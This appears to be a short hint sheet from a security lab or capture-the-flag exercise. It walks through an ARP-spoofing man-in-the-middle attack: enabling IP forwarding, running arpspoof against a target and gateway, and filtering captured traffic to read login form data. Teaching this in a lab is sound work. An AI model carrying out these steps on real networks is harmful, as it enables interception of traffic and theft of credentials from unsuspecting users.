Hints
Use: echo 1 > /proc/sys/net/ipv4/ip_forward
This tells the kernel to forward packets rather than dropping them.
Run arpspoof -i eth0 -t <target> <gateway>. You need two directions — spoof the target and spoof the gateway.
Filter by http.request.method==POST to isolate the login POST, then expand the HTTP layer in the detail pane to see form data.
